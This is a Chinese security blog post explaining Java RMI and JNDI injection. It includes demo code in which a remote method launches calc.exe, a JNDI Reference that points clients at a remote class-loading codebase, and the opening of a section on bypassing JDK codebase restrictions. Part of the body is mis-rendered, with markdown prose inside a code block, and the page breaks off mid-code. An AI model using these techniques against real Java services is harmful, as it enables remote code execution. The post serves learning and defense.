<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"mayylu.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta name="description" content="前言 JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口,但是jndi的参数不一定可控，在实战中jndi常常被用来上传我们的后门或执行自定义恶意代码，如fastjson的com.sun.rowset.JdbcRowSetImpl，也就是服务端攻击客户端">
<meta property="og:type" content="article">
<meta property="og:title" content="java jndi">
<meta property="og:url" content="https://mayylu.github.io/2023/10/15/java/java%20jndi/index.html">
<meta property="og:site_name" content="mayylu">
<meta property="og:description" content="前言 JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口,但是jndi的参数不一定可控，在实战中jndi常常被用来上传我们的后门或执行自定义恶意代码，如fastjson的com.sun.rowset.JdbcRowSetImpl，也就是服务端攻击客户端">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/%E5%9B%BE%E7%89%87-81-1024x633.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/jVWyTehR6InovSu.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/Reference-1-1024x492.png">
<meta property="article:published_time" content="2023-10-14T16:20:19.000Z">
<meta property="article:modified_time" content="2023-11-20T17:26:33.857Z">
<meta property="article:author" content="mayylu">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/%E5%9B%BE%E7%89%87-81-1024x633.png">


<link rel="canonical" href="https://mayylu.github.io/2023/10/15/java/java%20jndi/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mayylu.github.io/2023/10/15/java/java%20jndi/","path":"2023/10/15/java/java jndi/","title":"java jndi"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>java jndi | mayylu</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">mayylu</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#javaRMI"><span class="nav-number">2.</span> <span class="nav-text">javaRMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6"><span class="nav-number">2.1.</span> <span class="nav-text">安全限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#java-rmi-server-useCodebaseOnly"><span class="nav-number">2.1.1.</span> <span class="nav-text">java.rmi.server.useCodebaseOnly</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.2.</span> <span class="nav-text">rmi反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java-jndi"><span class="nav-number">3.</span> <span class="nav-text">java jndi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">3.1.</span> <span class="nav-text">Reference</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">3.1.1.</span> <span class="nav-text">使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#javax-naming-Reference-java"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">javax\naming\Reference.java</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#com-sun-jndi-rmi-registry-ReferenceWrapper-class"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">com\sun\jndi\rmi\registry\ReferenceWrapper.class</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#javax-naming-spi-NamingManager-java"><span class="nav-number">3.1.1.3.</span> <span class="nav-text">javax\naming\spi\NamingManager.java</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EBeanFactory%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8-tomcat%E4%BE%9D%E8%B5%96%E5%8C%85-lt-8-5-85"><span class="nav-number">3.1.2.</span> <span class="nav-text">基于BeanFactory的任意方法调用( tomcat依赖包&lt;8.5.85)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ResourceRef-java"><span class="nav-number">3.1.2.0.1.</span> <span class="nav-text">ResourceRef.java</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#org-apache-naming-factory-BeanFactory-java"><span class="nav-number">3.1.2.0.2.</span> <span class="nav-text">org&#x2F;apache&#x2F;naming&#x2F;factory&#x2F;BeanFactory.java</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">mayylu</p>
  <div class="site-description" itemprop="description">学习是一种生活态度</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">37</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://mayylu.github.io/2023/10/15/java/java%20jndi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mayylu">
      <meta itemprop="description" content="学习是一种生活态度">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mayylu">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          java jndi
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-10-15 00:20:19" itemprop="dateCreated datePublished" datetime="2023-10-15T00:20:19+08:00">2023-10-15</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2023-11-21 01:26:33" itemprop="dateModified" datetime="2023-11-21T01:26:33+08:00">2023-11-21</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的<strong>通用接口</strong>,但是jndi的参数不一定可控，在实战中jndi常常被用来上传我们的后门或执行自定义恶意代码，如fastjson的com.sun.rowset.JdbcRowSetImpl，也就是<strong>服务端攻击客户端</strong></p>
 <span id="more"></span>

<h2 id="javaRMI"><a href="#javaRMI" class="headerlink" title="javaRMI"></a>javaRMI</h2><p>Java RMI（Remote Method Invocation）是Java提供的一种远程方法调用机制。它允许在分布式系统中的不同Java虚拟机（JVM）之间进行方法调用。</p>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/%E5%9B%BE%E7%89%87-81-1024x633.png" alt="图片-81-1024x633"><br>调用流程:</p>
<ol>
<li>Server监听一个端口，这个端口是JVM随机选择的，并在Registry上绑定了远程对象</li>
<li>RMI Client 会远程连接RMI Registry端口，在Registry 寻找名字为evil的对象</li>
<li>Registry向Client发送Server上的序列化数据，包括IP，开放的随机端口，codebase等。</li>
<li>客户端在接受到之后会去codebase所指向的地址加载类(urlclass)，如果没有找到则说明是远程对象</li>
<li>客户端和服务端建立连接</li>
</ol>
<pre><code>Client-客户端：客户端调用服务端的方法，并发送序列化的参数信息
Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会序列化传输给客户端执行的结果,因此在Clinet看来，就好像是在本地执行了这个方法
Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用（在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Java中对于RMI Registry做了限制，只有源地址为localhost时才能调用bind、rebind、unbind等方法）
</code></pre>
<p>服务端(在实际应用中Server和Registry一般放在一起)：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义接口：首先，需要定义一个包含需要在远程系统上调用的方法的接口。这个接口中的方法称为远程接口。</span></span><br><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实现类：然后，编写一个实现远程接口的类。这个类是服务端的实现，它实现了远程接口定义的方法。</span></span><br><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">eviltest</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">eviltest</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiserver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);<span class="comment">// 注册RMI端口</span></span><br><span class="line">        evil evil = <span class="keyword">new</span> eviltest();</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1089/evil&quot;</span>, evil);<span class="comment">//服务端需要将实现类注册到RMI注册表中，以便客户端能够找到它</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>客户端调用服务端接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiclienr</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        evil evil = (evil) Naming.lookup(<span class="string">&quot;rmi://10.24.38.47:1089/evil&quot;</span>);<span class="comment">//注意这里应该强转为接口类</span></span><br><span class="line">        evil.evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>需要注意的是，Java RMI使用了Java序列化机制来将参数和返回值在客户端和服务端之间进行传输。因此，被传输的对象需要实现Serializable接口，或者使用其他可序列化的方式。</p>
<h3 id="安全限制"><a href="#安全限制" class="headerlink" title="安全限制"></a>安全限制</h3><h4 id="java-rmi-server-useCodebaseOnly"><a href="#java-rmi-server-useCodebaseOnly" class="headerlink" title="java.rmi.server.useCodebaseOnly"></a>java.rmi.server.useCodebaseOnly</h4><p>从JDK 6u45、7u21开始，该参数默认值为 true 的情况下，Java虚拟机将只信任预先配置好的codebase，不再支持从RMI请求中获取codebase。</p>
<h3 id="rmi反序列化"><a href="#rmi反序列化" class="headerlink" title="rmi反序列化"></a>rmi反序列化</h3><p>攻击Server端</p>
<p>当客户端需要调用的远程方法的参数中含有Object类，此时Client可以发送一个恶意的对象。由于远程对象是以序列化形式进行传输的，Server端接收的时候势必会对其进行反序列化</p>
<p>Server攻击Client</p>
<p>在RMI过程中，Server会把远程方法执行的结果返回给Client端，如果返回的结果是一个对象，那么这个对象会被序列化传输，并在Client端被反序列化</p>
<h2 id="java-jndi"><a href="#java-jndi" class="headerlink" title="java jndi"></a>java jndi</h2><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/jVWyTehR6InovSu.png" alt="jVWyTehR6InovSu"><br>JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等，也就是说jndi简化了客户端的操作，只用协议解析就可以调用不同的方法了</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/Reference-1-1024x492.png" alt="Reference-1-1024x492"><br>在JNDI服务中，RMI服务端除了直接绑定远程对象以外，还可以通过<strong>Reference</strong>类来绑定一个外部的远程对象，这个远程对象是当前名称目录系统之外的对象，绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>使用JNDI解析调用远程RMI方法<br>客户端<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 获取远程对象引用</span></span><br><span class="line">Context namingContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">EvilObject remoteObj = (EvilObject) namingContext.lookup(<span class="string">&quot;rmi://localhost/refObj&quot;</span>);<span class="comment">//示例代码通过lookup会自动使用rmiURLContext处理RMI请求。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用远程方法</span></span><br><span class="line">String result = remoteObj.sayHello();</span><br></pre></td></tr></table></figure><br> 服务端<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"> <span class="comment">// Reference需要传入三个参数 (className,factory,factoryLocation)</span></span><br><span class="line"> <span class="comment">// 第一个参数为别名，第二个参数填写我们http服务下的类名，第三个参数填写我们的远程地址</span></span><br><span class="line">    Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">    ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">    registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br></pre></td></tr></table></figure></p>
<h5 id="javax-naming-Reference-java"><a href="#javax-naming-Reference-java" class="headerlink" title="javax\naming\Reference.java"></a>javax\naming\Reference.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String className;</span><br><span class="line"><span class="keyword">protected</span> String classFactory = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">protected</span> String classFactoryLocation = <span class="keyword">null</span>;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>(className);</span><br><span class="line">       classFactory = factory;</span><br><span class="line">       classFactoryLocation = factoryLocation;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getFactoryClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> classFactory;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getFactoryClassLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> classFactoryLocation;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h5 id="com-sun-jndi-rmi-registry-ReferenceWrapper-class"><a href="#com-sun-jndi-rmi-registry-ReferenceWrapper-class" class="headerlink" title="com\sun\jndi\rmi\registry\ReferenceWrapper.class"></a>com\sun\jndi\rmi\registry\ReferenceWrapper.class</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceWrapper</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">RemoteReference</span> </span>&#123;<span class="comment">//ReferenceWrapper只是对Reference进行简单的包装</span></span><br><span class="line">    <span class="keyword">protected</span> Reference wrappee;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6078186197417641456L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.wrappee;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 安全限制</span><br><span class="line">该方法在底层实现中不同与rmi，rmi是使用RMIClassLoader.loadClass加载的，而是在Naming/Directory服务中里使用URLClassLoader加载的，因此不受 **java.rmi.server.useCodebaseOnly** 系统属性的限制</span><br><span class="line"></span><br><span class="line">在6u141,7u131,8u121之后，新增了 **com.sun.jndi.rmi.object.trustURLCodebase**选项，默认为<span class="keyword">false</span>，禁止RMI和CORBA协议通过RMI从远程的Codebase加载Reference工厂类，该更新阻止了RMI和CORBA触发漏洞</span><br><span class="line">随后在6u211,7u201.8u191中，又新增了 **com.sun.jndi.ldap.object.trustURLCodebase**选项，默认为<span class="keyword">false</span>，禁止LDAP协议使用远程codebase选项</span><br><span class="line"></span><br><span class="line">### 使用本地的Reference Factory类绕过高版本限制</span><br><span class="line">#### JNDI底层实现</span><br><span class="line">##### com\sun\jndi\rmi\registry\RegistryContext.class</span><br><span class="line">```<span class="function">java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;<span class="comment">//这里以rmi为例</span></span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//var1为我们传入的ReferenceWrapper</span></span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            Reference var8 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                var8 = (Reference)var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; 